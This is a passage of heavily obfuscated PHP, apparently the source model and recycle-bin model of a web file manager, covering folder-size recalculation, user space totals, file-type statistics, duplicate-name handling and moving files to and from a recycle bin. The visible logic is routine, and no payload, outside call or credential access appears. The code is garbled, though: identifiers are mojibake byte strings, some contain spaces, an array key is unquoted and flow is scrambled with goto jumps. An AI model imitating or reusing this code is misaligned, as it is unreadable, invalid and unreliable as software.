$d⁄±ãÓËÛ¯[0][$d“¬Ω∑áŸå[396]]; } return $this->pathInfo($a™”ÂÉ…¿∑, !0); } protected function updateModifyTime($däπÙ°¢Ü±) { goto Cèß»¨√∑û; F‘†ßúãÎì: if (!is_array($däπÙ°¢Ü±)) { $däπÙ°¢Ü± = array($däπÙ°¢Ü±); } foreach ($däπÙ°¢Ü± as $A”õÇÉ‘ı† => $FÜá¨◊∞∏ô) { $däπÙ°¢Ü±[$A”õÇÉ‘ı†] = intval($FÜá¨◊∞∏ô); $this->sourceCacheClear($FÜá¨◊∞∏ô); } $cﬁ¥÷¬õÒÕ = array($d◊¬ùﬁà∑⁄[396] => array($d◊¬ùﬁà∑⁄[7], $däπÙ°¢Ü±)); goto f ë⁄Ö◊‡∆; Cèß»¨√∑û: $d◊¬ùﬁà∑⁄ =& $_SERVER[™⁄»üÆ]; $bù—≤ûúº¨ = defined($d◊¬ùﬁà∑⁄[455]) ? USER_ID : $d◊¬ùﬁà∑⁄[191]; if (!$däπÙ°¢Ü±) { return; } goto F‘†ßúãÎì; f ë⁄Ö◊‡∆: $EÖﬁßùòò≥ = array($d◊¬ùﬁà∑⁄[566] => $bù—≤ûúº¨, $d◊¬ùﬁà∑⁄[418] => time()); $this->where($cﬁ¥÷¬õÒÕ)->save($EÖﬁßùòò≥); goto c…“îæ◊Î ; c…“îæ◊Î : } public function folderSizeReset($bìÛˆ≤±»Œ, $b°∞∂ﬂÖ°À = false) { goto bÈ¬“Œ±ƒú; f†»Ëﬂ≠íı: $aÎ≠ÊŸ‰èò = $A£à“¯√•ê[1997] . $bìÛˆ≤±»Œ; CacheLock::lock($aÎ≠ÊŸ‰èò, 20); if ($b°∞∂ﬂÖ°À === !1) { $this->sourceCacheClear($bìÛˆ≤±»Œ); $E≠¿◊Óûıê = $this->sourceInfo($bìÛˆ≤±»Œ); $e’éßË—π∞ = array($A£à“¯√•ê[395] => $bìÛˆ≤±»Œ, $A£à“¯√•ê[423] => 0); $a…≠£—≠ÌÖ = $this->where($e’éßË—π∞)->sum($A£à“¯√•ê[78]); $b°∞∂ﬂÖ°À = intval($a…≠£—≠ÌÖ) - intval($E≠¿◊Óûıê[$A£à“¯√•ê[78]]); } goto C‰ùõ‡¯·á; a‚û€ÇÑ’≥: $EÌàÖ¥õ€≤[] = $E≠¿◊Óûıê[$A£à“¯√•ê[396]]; $e’éßË—π∞ = array($A£à“¯√•ê[396] => array($A£à“¯√•ê[412], $EÌàÖ¥õ€≤)); if ($b°∞∂ﬂÖ°À < 0) { $e’éßË—π∞[$A£à“¯√•ê[78]] = array($A£à“¯√•ê[982], abs($b°∞∂ﬂÖ°À)); } goto a∏®’Ñ•’; a∏®’Ñ•’: $this->where($e’éßË—π∞)->setAdd($A£à“¯√•ê[78], $b°∞∂ﬂÖ°À); CacheLock::unlock($aÎ≠ÊŸ‰èò); $aÇ±éµÈî” = $A£à“¯√•ê[1998] . $E≠¿◊Óûıê[$A£à“¯√•ê[405]] . $A£à“¯√•ê[4] . $E≠¿◊Óûıê[$A£à“¯√•ê[485]]; goto A‡ÜëÖìò˜; C‰ùõ‡¯·á: if ($b°∞∂ﬂÖ°À == 0) { return CacheLock::unlock($aÎ≠ÊŸ‰èò); } $EÌàÖ¥õ€≤ = $this->parentLevelArray($E≠¿◊Óûıê[$A£à“¯√•ê[503]]); if (!$EÌàÖ¥õ€≤) { $EÌàÖ¥õ€≤ = array(); } goto a‚û€ÇÑ’≥; A‡ÜëÖìò˜: $FùèæÆæÿΩ = array($E≠¿◊Óûıê[$A£à“¯√•ê[405]], $E≠¿◊Óûıê[$A£à“¯√•ê[485]]); TaskRun::timeLimitCall($aÇ±éµÈî”, $A£à“¯√•ê[1999], $FùèæÆæÿΩ, 1.5); goto bÂ≤Ëó¨∂‡; bÈ¬“Œ±ƒú: $A£à“¯√•ê =& $_SERVER[™⁄»üÆ]; if ($this->statusIgnoreResetSpace) { return; } $E≠¿◊Óûıê = $this->sourceInfo($bìÛˆ≤±»Œ); goto f†»Ëﬂ≠íı; bÂ≤Ëó¨∂‡: } public function folderSizeResetChildren($AÌÔªö¡‡Í) { goto a‡ﬁ¬∫ßê◊; B» †‡Ò»õ: $aƒëáπëˆÑ[$b∑ºá‘¥õ—[404]] = 0; $FˆÚ§“πúﬂ = $this->field($FæØ¿Âä— )->where($aƒëáπëˆÑ)->select(); if (!$FˆÚ§“πúﬂ) { return; } goto AÚ¨‹∏¬ÒÙ; B≠‰ÜÚáÿ‘: foreach ($aÙ∆Ü®∑Úæ as $CÖàªÜìî§) { if ($CÖàªÜìî§[$b∑ºá‘¥õ—[78]] == $CÖàªÜìî§[$b∑ºá‘¥õ—[2001]]) { continue; } $D¥ò»à¯®Î[] = array($b∑ºá‘¥õ—[396], $CÖàªÜìî§[$b∑ºá‘¥õ—[396]], $b∑ºá‘¥õ—[78], $CÖàªÜìî§[$b∑ºá‘¥õ—[78]]); } $this->saveAll($D¥ò»à¯®Î); goto f≠‡ä≠‡ÉÀ; AÚ¨‹∏¬ÒÙ: $aÙ∆Ü®∑Úæ[] = $dµ©–“‹Ôõ; $aÙ∆Ü®∑Úæ = array_to_keyvalue($aÙ∆Ü®∑Úæ, $b∑ºá‘¥õ—[396]); foreach ($aÙ∆Ü®∑Úæ as $DÛÖ™£ËÊ∫ => $CÖàªÜìî§) { $aÙ∆Ü®∑Úæ[$DÛÖ™£ËÊ∫][$b∑ºá‘¥õ—[2001]] = $aÙ∆Ü®∑Úæ[$DÛÖ™£ËÊ∫][$b∑ºá‘¥õ—[78]]; $aÙ∆Ü®∑Úæ[$DÛÖ™£ËÊ∫][$b∑ºá‘¥õ—[78]] = 0; } goto bøçÈÉÇãã; B”âº»¥‹∞: $aƒëáπëˆÑ = array($b∑ºá‘¥õ—[560] => 1, $b∑ºá‘¥õ—[567] => array($b∑ºá‘¥õ—[526], $dµ©–“‹Ôõ[$b∑ºá‘¥õ—[503]] . $AÌÔªö¡‡Í . $b∑ºá‘¥õ—[527])); $FæØ¿Âä—  = $b∑ºá‘¥õ—[2000]; $aÙ∆Ü®∑Úæ = $this->field($FæØ¿Âä— )->where($aƒëáπëˆÑ)->select(); goto B» †‡Ò»õ; a‡ﬁ¬∫ßê◊: $b∑ºá‘¥õ— =& $_SERVER[™⁄»üÆ]; $this->sourceCacheClear($AÌÔªö¡‡Í); $dµ©–“‹Ôõ = $this->sourceInfo($AÌÔªö¡‡Í); goto B”âº»¥‹∞; bøçÈÉÇãã: foreach ($FˆÚ§“πúﬂ as $CÖàªÜìî§) { $eﬁ∫Ò„öÃ‡ = $CÖàªÜìî§[$b∑ºá‘¥õ—[479]] . $b∑ºá‘¥õ—[33]; if (!isset($aÙ∆Ü®∑Úæ[$eﬁ∫Ò„öÃ‡])) { continue; } if ($CÖàªÜìî§[$b∑ºá‘¥õ—[424]] == $aÙ∆Ü®∑Úæ[$eﬁ∫Ò„öÃ‡][$b∑ºá‘¥õ—[424]]) { $aÙ∆Ü®∑Úæ[$eﬁ∫Ò„öÃ‡][$b∑ºá‘¥õ—[78]] += $CÖàªÜìî§[$b∑ºá‘¥õ—[78]]; } } foreach ($aÙ∆Ü®∑Úæ as $CÖàªÜìî§) { $D¥˘Œï†±® = $this->parentLevelArray($CÖàªÜìî§[$b∑ºá‘¥õ—[503]]); foreach ($D¥˘Œï†±® as $eﬁ∫Ò„öÃ‡) { $eﬁ∫Ò„öÃ‡ = $eﬁ∫Ò„öÃ‡ . $b∑ºá‘¥õ—[33]; if (!isset($aÙ∆Ü®∑Úæ[$eﬁ∫Ò„öÃ‡])) { continue; } if ($CÖàªÜìî§[$b∑ºá‘¥õ—[424]] == $aÙ∆Ü®∑Úæ[$eﬁ∫Ò„öÃ‡][$b∑ºá‘¥õ—[424]]) { $aÙ∆Ü®∑Úæ[$eﬁ∫Ò„öÃ‡][$b∑ºá‘¥õ—[78]] += $CÖàªÜìî§[$b∑ºá‘¥õ—[78]]; } } } $D¥ò»à¯®Î = array(); goto B≠‰ÜÚáÿ‘; f≠‡ä≠‡ÉÀ: } public function userSpaceReset($e„£úâ§˜ = false) { $e·Ÿî·⁄©£ =& $_SERVER[™⁄»üÆ]; $E¨çΩÌÆô¨ = $this->where(array($e·Ÿî·⁄©£[405] => self::TYPE_USER, $e·Ÿî·⁄©£[485] => $e„£úâ§˜, $e·Ÿî·⁄©£[404] => 0))->sum($e·Ÿî·⁄©£[78]); $E¨çΩÌÆô¨ = !$E¨çΩÌÆô¨ || $E¨çΩÌÆô¨ <= 0 ? 0 : $E¨çΩÌÆô¨; Model($e·Ÿî·⁄©£[495])->userEdit($e„£úâ§˜, array($e·Ÿî·⁄©£[1692] => $E¨çΩÌÆô¨)); } public function targetSpaceUpdate($eÎéÏ®ò˜≥, $bÃáÑëÁ¶˘) { $bÔÕ…à±…Ò =& $_SERVER[™⁄»üÆ]; if (!$bÃáÑëÁ¶˘) { return; } if (!in_array($eÎéÏ®ò˜≥, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $CßôîìÎﬁ® = $this->targetSpaceSize($eÎéÏ®ò˜≥, $bÃáÑëÁ¶˘); if ($eÎéÏ®ò˜≥ == self::TYPE_USER) { Model($bÔÕ…à±…Ò[495])->userEdit($bÃáÑëÁ¶˘, array($bÔÕ…à±…Ò[1692] => $CßôîìÎﬁ®)); } else { if ($eÎéÏ®ò˜≥ == self::TYPE_GROUP) { Model($bÔÕ…à±…Ò[504])->groupEdit($bÃáÑëÁ¶˘, array($bÔÕ…à±…Ò[1692] => $CßôîìÎﬁ®)); } } } public function targetSpaceSize($a¿É¢Ô≈˘’, $då˜∑ÀÒüÑ) { goto b‡ÜÜã«‚ß; f âŸÁçÓÏ: $EÁã•∏Õ•ê = floatval($eâÖŒÔ—Ì°[$bΩê∞˘≈˘ª[78]]); $b∑öâµ˜èô = array($bΩê∞˘≈˘ª[567] => array($bΩê∞˘≈˘ª[526], $bΩê∞˘≈˘ª[513] . $eâÖŒÔ—Ì°[$bΩê∞˘≈˘ª[396]] . $bΩê∞˘≈˘ª[527])); $f∂∂ˆ†≥ò¯ = Model($bΩê∞˘≈˘ª[422])->field($bΩê∞˘≈˘ª[411])->where($b∑öâµ˜èô)->select(); goto D—¶ı∆€∆«; D—¶ı∆€∆«: $f∂∂ˆ†≥ò¯ = array_to_keyvalue($f∂∂ˆ†≥ò¯, $bΩê∞˘≈˘ª[33], $bΩê∞˘≈˘ª[396]); $f∂∂ˆ†≥ò¯ = array_unique(array_filter($f∂∂ˆ†≥ò¯)); if ($f∂∂ˆ†≥ò¯) { $b∑öâµ˜èô = array($bΩê∞˘≈˘ª[411] => array($bΩê∞˘≈˘ª[412], $f∂∂ˆ†≥ò¯)); $EÁã•∏Õ•ê += floatval($this->where($b∑öâµ˜èô)->sum($bΩê∞˘≈˘ª[78])); } goto B°®Ö§ˆÒÃ; B°®Ö§ˆÒÃ: $EÁã•∏Õ•ê = !$EÁã•∏Õ•ê || $EÁã•∏Õ•ê <= 0 ? 0 : $EÁã•∏Õ•ê; return $EÁã•∏Õ•ê; goto fÂÉºë±±Ã; b‡ÜÜã«‚ß: $bΩê∞˘≈˘ª =& $_SERVER[™⁄»üÆ]; $eâÖŒÔ—Ì° = $this->sourceRoot($a¿É¢Ô≈˘’, $då˜∑ÀÒüÑ, !0); if (!$eâÖŒÔ—Ì°) { return 0; } goto f âŸÁçÓÏ; fÂÉºë±±Ã: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($F´»öÊπß“) { return $this->fileTypeProfile($F´»öÊπß“, SourceModel::TYPE_USER); } public function groupFileTypeProfile($A»∂Ÿ”∑¡‘) { return $this->fileTypeProfile($A»∂Ÿ”∑¡‘, SourceModel::TYPE_GROUP); } private function fileTypeProfile($bÆÃ…’§©, $cùÖ’§∏∞ä) { goto BÆëŸÍñÉ±; b¬ƒÊÆ®˘∑: if ($C¬èÚÑ¥Õä) { return $C¬èÚÑ¥Õä; } $DÆ˘à∑…„≈ = array($a∞Ωß∑¬ß˘[560] => 0); if ($bÆÃ…’§© != !1) { $DÆ˘à∑…„≈[$a∞Ωß∑¬ß˘[485]] = $bÆÃ…’§©; $DÆ˘à∑…„≈[$a∞Ωß∑¬ß˘[405]] = $cùÖ’§∏∞ä; } goto bçÑ…›ùÁ¬; BÆëŸÍñÉ±: $a∞Ωß∑¬ß˘ =& $_SERVER[™⁄»üÆ]; $d¶Ω≠≤áûâ = $a∞Ωß∑¬ß˘[2002] . $bÆÃ…’§© . $a∞Ωß∑¬ß˘[71] . $cùÖ’§∏∞ä; $C¬èÚÑ¥Õä = Cache::get($d¶Ω≠≤áûâ); goto b¬ƒÊÆ®˘∑; bçÑ…›ùÁ¬: $F≤‡èÁÏàÔ = array(); $F≤‡èÁÏàÔ[$a∞Ωß∑¬ß˘[2003]] = array($a∞Ωß∑¬ß˘[2004] => LNG($a∞Ωß∑¬ß˘[2003]), $a∞Ωß∑¬ß˘[2005] => $this->where($DÆ˘à∑…„≈)->count(), $a∞Ωß∑¬ß˘[562] => $this->where($DÆ˘à∑…„≈)->sum($a∞Ωß∑¬ß˘[78])); $F¡∫Ë≤¯ç¢ = KodIO::fileTypeList(); goto a¶∂Ñèúò…; a¶∂Ñèúò…: foreach ($F¡∫Ë≤¯ç¢ as $dëâ÷∫ıßÒ => $F¥Ü¨ÊÍÔæ) { $DÆ˘à∑…„≈[$a∞Ωß∑¬ß˘[406]] = $this->fileTypeWhere($dëâ÷∫ıßÒ); $F≤‡èÁÏàÔ[$dëâ÷∫ıßÒ] = array($a∞Ωß∑¬ß˘[2004] => $F¥Ü¨ÊÍÔæ[$a∞Ωß∑¬ß˘[28]], $a∞Ωß∑¬ß˘[2005] => $this->where($DÆ˘à∑…„≈)->count(), $a∞Ωß∑¬ß˘[562] => $this->where($DÆ˘à∑…„≈)->sum($a∞Ωß∑¬ß˘[78])); } Cache::set($d¶Ω≠≤áûâ, $F≤‡èÁÏàÔ, 1200); return $F≤‡èÁÏàÔ; goto d™ûÑªóéΩ; d™ûÑªóéΩ: } public function fileNameExist($D¬ÚÆ’êØ≈, $a˜Â§ÏëÔÈ) { $EŒ€¬ìÆçú =& $_SERVER[™⁄»üÆ]; $D±⁄—´Ö√‘ = $this->where(array($EŒ€¬ìÆçú[479] => $D¬ÚÆ’êØ≈, $EŒ€¬ìÆçú[28] => $a˜Â§ÏëÔÈ, $EŒ€¬ìÆçú[424] => 0))->find(); return is_array($D±⁄—´Ö√‘) ? $D±⁄—´Ö√‘[$EŒ€¬ìÆçú[396]] : !1; } public function childList($béŸﬁäñäÜ) { goto Cû§æÌÜ“¿; Cû§æÌÜ“¿: $e¿ê≥¶îãá =& $_SERVER[™⁄»üÆ]; $DÌ·ÔÎ“”í = $e¿ê≥¶îãá[1980] . $béŸﬁäñäÜ; if (isset(self::$cacheChildList[$DÌ·ÔÎ“”í])) { return self::$cacheChildList[$DÌ·ÔÎ“”í]; } goto DÆëú—Íãì; DÆëú—Íãì: $b·¥ü£ûîõ = array($e¿ê≥¶îãá[479] => intval($béŸﬁäñäÜ), $e¿ê≥¶îãá[424] => 0); $cìÍªÉº®“ = $this->where($b·¥ü£ûîõ)->select(); $cìÍªÉº®“ = $cìÍªÉº®“ ? $cìÍªÉº®“ : array(); goto D÷Ü»¬œ’; D÷Ü»¬œ’: self::$cacheChildList[$DÌ·ÔÎ“”í] = $cìÍªÉº®“; foreach ($cìÍªÉº®“ as $fª›ãÂ´é≠) { $DÌ·ÔÎ“”í = $e¿ê≥¶îãá[439] . $fª›ãÂ´é≠[$e¿ê≥¶îãá[396]]; self::$cacheSourceInfo[$DÌ·ÔÎ“”í] = $fª›ãÂ´é≠; } return $cìÍªÉº®“; goto D∞™‰„ﬂÜ°; D∞™‰„ﬂÜ°: } public function fileNameAuto($A˘õ´⁄◊“‰, $E¥Îáè˜≥¬, $aµ‘€¿§ﬂÊ = REPEAT_RENAME, $AöÜ¢∑üÖ = false) { $BÚŸòåäÌ¢ =& $_SERVER[™⁄»üÆ]; $CóõÚ¯˘…è = array($BÚŸòåäÌ¢[479] => $A˘õ´⁄◊“‰, $BÚŸòåäÌ¢[424] => 0, $BÚŸòåäÌ¢[28] => array($BÚŸòåäÌ¢[380], $E¥Îáè˜≥¬ . $BÚŸòåäÌ¢[381])); $bÚüù‹î™™ = $this->field($BÚŸòåäÌ¢[28])->where($CóõÚ¯˘…è)->select(); $aÉºˆÓıØ¥ = array_to_keyvalue($bÚüù‹î™™, $BÚŸòåäÌ¢[33], $BÚŸòåäÌ¢[28]); return $this->fileNameAutoGet($aÉºˆÓıØ¥, $E¥Îáè˜≥¬, $aµ‘€¿§ﬂÊ, $AöÜ¢∑üÖ); } public function fileNameAutoGet($f≠ÂÖ„—ÉÆ, $càäã¨ë‡Æ, $c˘§ë‚Ê¥¡, $fÂÉ®ñÀ˘™) { $dÑ√ÉÛÔÜ¬ =& $_SERVER[™⁄»üÆ]; if ($c˘§ë‚Ê¥¡ == REPEAT_REPLACE || !$f≠ÂÖ„—ÉÆ || !in_array_not_case($càäã¨ë‡Æ, $f≠ÂÖ„—ÉÆ) || $fÂÉ®ñÀ˘™ && $c˘§ë‚Ê¥¡ != REPEAT_RENAME_FOLDER) { return $càäã¨ë‡Æ; } if ($c˘§ë‚Ê¥¡ == REPEAT_SKIP) { return !1; } $Fæ´∏ÖØÜÃ = $dÑ√ÉÛÔÜ¬[95] . get_path_ext($càäã¨ë‡Æ); $Fæ´∏ÖØÜÃ = $Fæ´∏ÖØÜÃ == $dÑ√ÉÛÔÜ¬[95] || $fÂÉ®ñÀ˘™ ? $dÑ√ÉÛÔÜ¬[33] : $Fæ´∏ÖØÜÃ; for ($FòàïÀ›ı« = 1; $FòàïÀ›ı« <= count($f≠ÂÖ„—ÉÆ) + 1; $FòàïÀ›ı«++) { $C•ªÃ¬ÛÚ£ = substr($càäã¨ë‡Æ, 0, strlen($càäã¨ë‡Æ) - strlen($Fæ´∏ÖØÜÃ)); $CÂíÔ˘îÂÜ = $C•ªÃ¬ÛÚ£ . "\50{$FòàïÀ›ı«}\x29{$Fæ´∏ÖØÜÃ}"; if (!in_array_not_case($CÂíÔ˘îÂÜ, $f≠ÂÖ„—ÉÆ)) { return $CÂíÔ˘îÂÜ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\x72\143\x65\137\162\x65\143\171\143\x6c\x65"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\124\151\155\145", "\164\151\155\145", "\151\156\163\145\x72\x74", "\146\165\x6e\143\x74\151\157\156")); public function listData($c¿Ô•âãóó = false) { $fŸÀË•∆ó =& $_SERVER[™⁄»üÆ]; $c¿Ô•âãóó = $c¿Ô•âãóó ? $c¿Ô•âãóó : USER_ID; $Fÿöıóÿº∆ = $this->where(array($fŸÀË•∆ó[1528] => $c¿Ô•âãóó))->select(); return array_to_keyvalue($Fÿöıóÿº∆, $fŸÀË•∆ó[33], $fŸÀË•∆ó[396]); } public function moveToRecycle($d◊ãá¥ÏŒ´) { goto C§…®ã©‚ë; F∏¥ì≈™ŸÌ: if (!$CΩ–ˆæÈ£ç || $CΩ–ˆæÈ£ç[$EÖØ¡¥Ñ‚Ú[424]] == $EÖØ¡¥Ñ‚Ú[87]) { return; } $e¶ÂÌÜ∫‰É = array($EÖØ¡¥Ñ‚Ú[411] => $d◊ãá¥ÏŒ´, $EÖØ¡¥Ñ‚Ú[1528] => USER_ID, $EÖØ¡¥Ñ‚Ú[563] => $CΩ–ˆæÈ£ç[$EÖØ¡¥Ñ‚Ú[405]], $EÖØ¡¥Ñ‚Ú[564] => $CΩ–ˆæÈ£ç[$EÖØ¡¥Ñ‚Ú[485]], $EÖØ¡¥Ñ‚Ú[567] => $CΩ–ˆæÈ£ç[$EÖØ¡¥Ñ‚Ú[503]]); $this->add($e¶ÂÌÜ∫‰É); goto a∏Ô£ï·áΩ; a∏Ô£ï·áΩ: $this->recycleMove($d◊ãá¥ÏŒ´, 1); if ($CΩ–ˆæÈ£ç[$EÖØ¡¥Ñ‚Ú[404]] == $EÖØ¡¥Ñ‚Ú[87]) { $Bñüí«éô∫ = array($EÖØ¡¥Ñ‚Ú[567] => array($EÖØ¡¥Ñ‚Ú[526], $CΩ–ˆæÈ£ç[$EÖØ¡¥Ñ‚Ú[503]] . $d◊ãá¥ÏŒ´ . $EÖØ¡¥Ñ‚Ú[527])); $aΩ÷Ù’Î›‘->where($Bñüí«éô∫)->setField($EÖØ¡¥Ñ‚Ú[424], 1); } goto eﬁë·⁄‹´Ò; C§…®ã©‚ë: $EÖØ¡¥Ñ‚Ú =& $_SERVER[™⁄»üÆ]; $aΩ÷Ù’Î›‘ = Model($EÖØ¡¥Ñ‚Ú[1214]); $CΩ–ˆæÈ£ç = $aΩ÷Ù’Î›‘->sourceInfo($d◊ãá¥ÏŒ´); goto F∏¥ì≈™ŸÌ; eﬁë·⁄‹´Ò: } public function clear() { $this->remove(!1); } public function remove($B§¶‚±õ´™ = false, $DØª √òà  = false) { goto C§ÚÇÈ£∫ù; f∞â≠Ç´¨Ö: $a≤Ÿ‰æõ√‰ = $this->listData($DØª √òà ); $B§¶‚±õ´™ = $B§¶‚±õ´™ === !1 ? !1 : $B§¶‚±õ´™; $eöÀ¿≠ˆÇ = array(); goto e¢Í´í©≠£; e¢Í´í©≠£: foreach ($a≤Ÿ‰æõ√‰ as $c®´™∆ÚÛ≥) { if ($B§¶‚±õ´™ != !1 && !in_array($c®´™∆ÚÛ≥, $B§¶‚±õ´™)) { continue; } $bõÍö∆∫â± = $a±≠ä„∫∑«->sourceInfo($c®´™∆ÚÛ≥); $a±≠ä„∫∑«->remove($c®´™∆ÚÛ≥, !1); $aï∂•∂ÃΩ· = $bõÍö∆∫â±[$B∑çöÒ»Œñ[405]] . $B∑çöÒ»Œñ[71] . $bõÍö∆∫â±[$B∑çöÒ»Œñ[485]]; $eöÀ¿≠ˆÇ[$aï∂•∂ÃΩ·] = array($B∑çöÒ»Œñ[563] => $bõÍö∆∫â±[$B∑çöÒ»Œñ[405]], $B∑çöÒ»Œñ[485] => $bõÍö∆∫â±[$B∑çöÒ»Œñ[485]]); $this->where(array($B∑çöÒ»Œñ[396] => $c®´™∆ÚÛ≥))->delete(); } foreach ($eöÀ¿≠ˆÇ as $AÚ√—≈ÔƒÏ) { $a±≠ä„∫∑«->targetSpaceUpdate($AÚ√—≈ÔƒÏ[$B∑çöÒ»Œñ[405]], $AÚ√—≈ÔƒÏ[$B∑çöÒ»Œñ[485]]); } goto fÛ–¡«≠öá; C§ÚÇÈ£∫ù: $B∑çöÒ»Œñ =& $_SERVER[™⁄»üÆ]; $DØª √òà  = $DØª √òà  ? $DØª √òà  : USER_ID; $a±≠ä„∫∑« = Model($B∑çöÒ»Œñ[1214]); goto f∞â≠Ç´¨Ö; fÛ–¡«≠öá: } public function restore($c◊É¢äŸ†ë = false) { $e ◊°—ÿÁ˜ = $this->listData(); $this->_restoreSource($e ◊°—ÿÁ˜, $c◊É¢äŸ†ë); } public function removeUserAll($E€œë¿∞∑π) { $this->remove(!1, $E€œë¿∞∑π); } private function _restoreSource($cÿÒ»º∞≤Ç, $c–ÛÛÌªÎÒ) { goto C∂ﬁ‚ï¶≠; Bøèµ∂Ûàæ: $aèìêÚû’ò->updateModifyTime($e√≤†ÁÏÏé); goto b»‚‚≈Õ¬É; EΩãöë‡—Á: if (!$cÿÒ»º∞≤Ç) { return !0; } $e√≤†ÁÏÏé = array(); foreach ($cÿÒ»º∞≤Ç as $e⁄áõ±ÛﬂÙ) { goto bäﬂâñÚÖ™; bäﬂâñÚÖ™: if ($c–ÛÛÌªÎÒ != !1 && !in_array($e⁄áõ±ÛﬂÙ, $c–ÛÛÌªÎÒ)) { continue; } $Eç ÂçãöÚ = $aèìêÚû’ò->sourceInfo($e⁄áõ±ÛﬂÙ); $DÂ⁄»™è…è = $aèìêÚû’ò->sourceInfo($Eç ÂçãöÚ[$e»ÌÎÑ«ïå[479]]); goto E±˘ö≥ÚÓà; d´À“èçÖ˜: $e√≤†ÁÏÏé[] = $Eç ÂçãöÚ[$e»ÌÎÑ«ïå[479]]; if ($Eç ÂçãöÚ[$e»ÌÎÑ«ïå[404]] == $e»ÌÎÑ«ïå[87]) { $e√≤†ÁÏÏé[] = $e⁄áõ±ÛﬂÙ; } $aèìêÚû’ò->lockMoveEnd($e⁄áõ±ÛﬂÙ); goto B≠ˆüÙÒØÒ; E±˘ö≥ÚÓà: if ($DÂ⁄»™è…è[$e»ÌÎÑ«ïå[424]] == $e»ÌÎÑ«ïå[87]) { continue; } $aèìêÚû’ò->lockMoveStart($e⁄áõ±ÛﬂÙ); $this->recycleMove($e⁄áõ±ÛﬂÙ, 0); goto BéÏ®±Ü∏‰; BéÏ®±Ü∏‰: if ($Eç ÂçãöÚ[$e»ÌÎÑ«ïå[404]] == $e»ÌÎÑ«ïå[87]) { $büœ‰‹˘«ƒ = array($e»ÌÎÑ«ïå[567] => array($e»ÌÎÑ«ïå[526], $Eç ÂçãöÚ[$e»ÌÎÑ«ïå[503]] . $e⁄áõ±ÛﬂÙ . $e»ÌÎÑ«ïå[527])); $aèìêÚû’ò->where($büœ‰‹˘«ƒ)->setField($e»ÌÎÑ«ïå[424], 0); $this->restoreFolderChildren($e⁄áõ±ÛﬂÙ, $cÿÒ»º∞≤Ç); } $this->where(array($e»ÌÎÑ«ïå[396] => $e⁄áõ±ÛﬂÙ))->delete(); $aèìêÚû’ò->folderSizeReset($Eç ÂçãöÚ[$e»ÌÎÑ«ïå[479]]); goto d´À“èçÖ˜; B≠ˆüÙÒØÒ: } goto Bøèµ∂Ûàæ; C∂ﬁ‚ï¶≠: $e»ÌÎÑ«ïå =& $_SERVER[™⁄»üÆ]; $aèìêÚû’ò = Model($e»ÌÎÑ«ïå[1214]); $c–ÛÛÌªÎÒ = $c–ÛÛÌªÎÒ == !1 ? !1 : $c–ÛÛÌªÎÒ; goto EΩãöë‡—Á; b»‚‚≈Õ¬É: } private function restoreFolderChildren($fıÙÃŸÒ¡ò, $bÑâÆû¬Ñ’) { goto aÂµ ∞¿¶À; Fñ‰©û¢´ö: foreach ($bÑâÆû¬Ñ’ as $aôƒÕÑá¥ü) { if ($aôƒÕÑá¥ü == $fıÙÃŸÒ¡ò) { continue; } if (!$Dﬂ¢……úœÃ->isParentOf($fıÙÃŸÒ¡ò, $aôƒÕÑá¥ü)) { continue; } $Cﬁúå§ıí‚ = $Dﬂ¢……úœÃ->sourceInfo($aôƒÕÑá¥ü); if ($Cﬁúå§ıí‚[$Dƒï†Æµ›Ç[404]] == $Dƒï†Æµ›Ç[87]) { $f·‹˘’÷¬◊[] = array($Dƒï†Æµ›Ç[567] => array($Dƒï†Æµ›Ç[526], $Cﬁúå§ıí‚[$Dƒï†Æµ›Ç[503]] . $aôƒÕÑá¥ü . $Dƒï†Æµ›Ç[527])); } else { $f·‹˘’÷¬◊[$Dƒï†Æµ›Ç[396]][1][] = $aôƒÕÑá¥ü; } } if (!$f·‹˘’÷¬◊[$Dƒï†Æµ›Ç[396]][1]) { unset($f·‹˘’÷¬◊[$Dƒï†Æµ›Ç[396]]); } if (!$f·‹˘’÷¬◊) { return; } goto EΩ˘ê‚‚ä¢; EΩ˘ê‚‚ä¢: $f·‹˘’÷¬◊[$Dƒï†Æµ›Ç[396]][1] = array_unique($f·‹˘’÷¬◊[$Dƒï†Æµ›Ç[396]][1]); $f·‹˘’÷¬◊[$Dƒï†Æµ›Ç[967]] = $Dƒï†Æµ›Ç[1798]; $Dﬂ¢……úœÃ->where($f·‹˘’÷¬◊)->setField($Dƒï†Æµ›Ç[424], 1); goto CÃÏÂÙÑíÿ; aÂµ ∞¿¶À: $Dƒï†Æµ›Ç =& $_SERVER[™⁄»üÆ]; $Dﬂ¢……úœÃ = Model($Dƒï†Æµ›Ç[1214]); $f·‹˘’÷¬◊ = array($Dƒï†Æµ›Ç[396] => array($Dƒï†Æµ›Ç[7], array())); goto Fñ‰©û¢´ö; CÃÏÂÙÑíÿ: } private function recycleMove($FßâÖ…ı◊ì, $eË™°ØΩÊ = 1) { $d‚êπìÈª  =& $_SERVER[™⁄»üÆ]; $eŒÁﬁÑ‘Ìä = Model($d‚êπìÈª [1214]); $a∏Ì≈øüöø = Model($d‚êπìÈª [2006]); $CÑ≤ßŸíÇ… = array($d‚êπìÈª [396] => $FßâÖ…ı◊ì); if ($eË™°ØΩÊ) { $eŒÁﬁÑ‘Ìä->where($CÑ≤ßŸíÇ…)->setField($d‚êπìÈª [424], 1); $a∏Ì≈øüöø->eventRecycle($FßâÖ…ı◊ì, $d‚êπìÈª [2007]); } else { $fúÈ∞ƒ´Ç≠ = $eŒÁﬁÑ‘Ìä->where($CÑ≤ßŸíÇ…)->find(); $D™’åäŒπ = $fúÈ∞ƒ´Ç≠[$d‚êπìÈª [404]] == $d‚êπìÈª [87]; $fèàùÍ»ï = $eŒÁﬁÑ‘Ìä->fileNameAuto($fúÈ∞ƒ´Ç≠[$d‚êπìÈª [479]], $fúÈ∞ƒ´Ç≠[$d‚êπìÈª [28]], REPEAT_RENAME_FOLDER, $D™’åäŒπ); if ($fèàùÍ»ï != $fúÈ∞ƒ´Ç≠[$d‚êπìÈª [28]]) { $eŒÁﬁÑ‘Ìä->rename($FßâÖ…ı◊ì, $fèàùÍ»ï); } $eŒÁﬁÑ‘Ìä->where($CÑ≤ßŸíÇ…)->setField($d‚êπìÈª [424], 0); $a∏Ì≈øüöø->eventRecycle($FßâÖ…ı◊ì, $d‚êπìÈª [2008]); } } } goto A√Áäß¡®Ò; B¶„ëæŸ…„: class DbManage { function __construct($C®”Õß¥´Ë, 